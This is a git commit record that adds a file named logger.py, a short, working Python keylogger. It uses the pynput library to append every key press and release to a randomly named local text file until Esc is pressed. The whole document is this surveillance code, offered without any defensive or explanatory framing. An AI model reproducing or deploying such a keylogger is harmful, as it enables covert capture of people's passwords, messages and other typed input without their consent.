fdcaff476a9e5fb67d3a90d6431ab174c40e386f
yanxious <58111743+yanxious@users.noreply.github.com>
2019-12-17 16:31:38 +0000

    first commit

---
+++ logger.py
@@ -0,0 +1,20 @@
+from random import randint
+from pynput.keyboard import Key, Listener
+
+
+output = "kld" + str(randint(0, 10000)) + ".txt"
+
+with open(output, "w") as f:
+    f.close()
+def on_press(key):
+    with open(output, "a") as f:
+        f.write("{0}".format(key))
+        f.close()
+def on_release(key):
+    with open(output, "a") as f:
+        f.write("{0}".format(key))
+        f.close()
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
